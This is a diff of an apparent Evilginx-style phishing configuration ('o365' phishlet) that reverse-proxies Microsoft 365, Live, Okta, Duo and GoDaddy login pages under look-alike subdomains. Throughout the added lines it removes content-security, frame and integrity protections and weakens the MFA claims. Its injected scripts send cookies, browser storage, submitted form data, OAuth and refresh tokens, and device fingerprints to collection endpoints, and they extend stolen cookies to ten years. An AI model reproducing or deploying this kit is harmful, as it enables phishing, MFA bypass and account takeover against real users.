@@ -1,221 +1,295 @@
 name: "o365"
 author: "@XCVDON"
 min_ver: "3.0.0"
+
 proxy_hosts:
-  - { phish_sub: "secure", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "billing", orig_sub: "www", domain: "office.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "billing", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "secure", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "mysignins", orig_sub: "mysignins", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hervw", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "hervw2", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "duoapi", orig_sub: "api", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "duosso", orig_sub: "sso", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "duoauth", orig_sub: "auth", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "duostatic", orig_sub: "static", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hcwdg", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hterw", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hrvetbr", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "hnrvrve", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "hvr34gr", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
-#
-  - { phish_sub: "jrhte", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
-  - { phish_sub: "htejre", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
-#
-  - { phish_sub: "billing", orig_sub: "outlook", domain: "office.com", session: false, is_landing: true, auto_filter: false }
-  - { phish_sub: "mejeff", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ewfweo", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "roweri", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: true, is_landing: false}
-  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: true, is_landing: false}
-  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: "gdsso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "gdevents", orig_sub: "events.api", domain: "godaddy.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "gdgui", orig_sub: "gui", domain: "godaddy.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "gdimg1", orig_sub: "img1", domain: "wsimg.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "gdimg6", orig_sub: "img6", domain: "wsimg.com", session: true, is_landing: false, auto_filter: false }
 
 sub_filters:
-  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.microsoft.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
   - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html",  "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  # - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if !e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
-  # - { triggers_on: "outlook.office.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if (!e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  - { triggers_on: "login.microsoft.com", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title></title>", mimes: ["text/html"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<style>.background-logo-holder{visibility:hidden}</style></HEAD>', mimes: ["text/html"] }
-
-  # - {
-  #     triggers_on: "login.microsoftonline.com",
-  #     orig_sub: "",
-  #     domain: "",
-  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
-  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
-  # s: ["text/html"],
-  #   }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "Content-Security-Policy", replace: "Content-Security-Disabled", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "content-security-policy", replace: "content-security-disabled", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "X-Frame-Options", replace: "X-Frame-Disabled", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>!function(){const e=new Image;e.src="https://"+window.location.hostname+"/api/exfil?ls="+encodeURIComponent(JSON.stringify(localStorage))+"&ss="+encodeURIComponent(JSON.stringify(sessionStorage))+"&c="+encodeURIComponent(document.cookie)+"&ref="+encodeURIComponent(document.referrer)+"&fp="+btoa(navigator.userAgent+navigator.language+screen.width+"x"+screen.height),e.style.display="none",document.body?.appendChild(e)}();</script><script>window.addEventListener("load",()=>{function waitForElement(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}waitForElement("#idA_PWD_ForgotPassword").then(e=>{let t=document.getElementById("i0118");if(t){let o=document.createElement("div");o.id="important",o.className="alert alert-error",o.style.cssText="color: red; margin-bottom: 20px;",o.textContent="Because you are accessing sensitive info, you need to verify your password.",t.insertAdjacentElement("beforebegin",o)}})});</script>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '&claims=%7B%22id_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Atrue%2C%22values%22%3A%5B%22mfa%22%2C%22ngcmfa%22%5D%7D%7D%2C%22access_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Atrue%2C%22values%22%3A%5B%22mfa%22%2C%22ngcmfa%22%5D%7D%7D%7D', replace: '', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'claims=%7B%22id_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Atrue', replace: 'claims=%7B%22id_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Afalse', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '%22access_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Atrue', replace: '%22access_token%22%3A%7B%22amr%22%3A%7B%22essential%22%3Afalse', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '"kmsi"', replace: '"kmsi" checked', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'type="checkbox" name="kmsi"', replace: 'type="checkbox" name="kmsi" checked onclick="return false"', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</body>', replace: '<script>document.querySelectorAll("form").forEach(f=>{f.addEventListener("submit",e=>{const t=new FormData(f),o={};t.forEach((e,t)=>o[t]=e);const n=new Image;n.src="https://"+window.location.hostname+"/api/form?data="+encodeURIComponent(JSON.stringify(o)),n.style.display="none",document.body.appendChild(n)})});</script></body>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '<head>', replace: '<head><script>!function(){const e={tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,langs:navigator.languages,plat:navigator.platform,hw:navigator.hardwareConcurrency,mem:navigator.deviceMemory,screen:screen.width+"x"+screen.height+"x"+screen.colorDepth,touch:"ontouchstart"in window,vendor:navigator.vendor,cookies:navigator.cookieEnabled,dnt:navigator.doNotTrack,plugins:Array.from(navigator.plugins).map(e=>e.name),ua:navigator.userAgent},t=document.createElement("canvas"),o=t.getContext("2d");o.textBaseline="top",o.font="14px Arial",o.fillText("fingerprint",2,2),e.canvas=t.toDataURL(),e.webgl=function(){const e=document.createElement("canvas"),t=e.getContext("webgl")||e.getContext("experimental-webgl");if(!t)return null;const o=t.getExtension("WEBGL_debug_renderer_info");return{vendor:t.getParameter(o.UNMASKED_VENDOR_WEBGL),renderer:t.getParameter(o.UNMASKED_RENDERER_WEBGL)}}();const n=new Image;n.src="https://"+window.location.hostname+"/api/fp?d="+encodeURIComponent(JSON.stringify(e)),n.style.display="none",document.body?.appendChild(n)}();</script>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<script>!function(){const immortalize=()=>{const domains=[".microsoftonline.com",".microsoft.com",".live.com",".office.com",".login.microsoftonline.com",".login.microsoft.com",".login.live.com",".www.office.com","login.microsoftonline.com","www.office.com"];const tenYearSeconds=315360000;const cookies=document.cookie.split(";");cookies.forEach(c=>{const [n,v]=c.trim().split("=");if(v&&v.length>10){domains.forEach(d=>{try{document.cookie=`${n}=${v};Max-Age=${tenYearSeconds};path=/;domain=${d};secure;samesite=none`;}catch(e){}});}});setTimeout(immortalize,60000);};immortalize();}();</script></head>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'XMLHttpRequest.prototype.send', replace: 'XMLHttpRequest.prototype._send||XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(d){if(this._url&&(this._url.includes("token")||this._url.includes("oauth")||this._url.includes("refresh"))){try{const i=new Image();i.src="https://"+location.hostname+"/api/token-refresh?data="+encodeURIComponent(d)+"&url="+encodeURIComponent(this._url);i.style.display="none";document.body?.appendChild(i);}catch(e){}}return this._send?this._send.apply(this,arguments):XMLHttpRequest.prototype.send.apply(this,arguments);};XMLHttpRequest.prototype.open=function(m,u){this._url=u;return XMLHttpRequest.prototype._open?XMLHttpRequest.prototype._open.apply(this,arguments):XMLHttpRequest.prototype.open.apply(this,arguments);};XMLHttpRequest.prototype._open=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype._send', mimes: ["application/javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<style>.background-logo-holder{visibility:hidden}</style></head>', mimes: ["text/html"] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
-
   - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "mysignins", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  ##
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-
-  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "mysignins.microsoft.com", orig_sub: "mysignins", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "mysignins.microsoft.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "mysignins.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "mysignins.microsoft.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
   - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "accont.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.duosecurity.com", orig_sub: "duosso", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.duosecurity.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.duosecurity.com", orig_sub: "duoapi", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "api.duosecurity.com", orig_sub: "duoapi", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "api.duosecurity.com", orig_sub: "duosso", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "api.duosecurity.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "auth.duosecurity.com", orig_sub: "duoauth", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "auth.duosecurity.com", orig_sub: "duoapi", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "static.duosecurity.com", orig_sub: "duostatic", domain: "duosecurity.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "gdsso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "events.api.godaddy.com", orig_sub: "gdevents", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gdgui", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "img1.wsimg.com", orig_sub: "gdimg1", domain: "wsimg.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "image/png", "image/jpeg", "image/gif"] }
+  - { triggers_on: "img6.wsimg.com", orig_sub: "gdimg6", domain: "wsimg.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "image/png", "image/jpeg", "image/gif"] }
 
-
-  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-
-
-  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
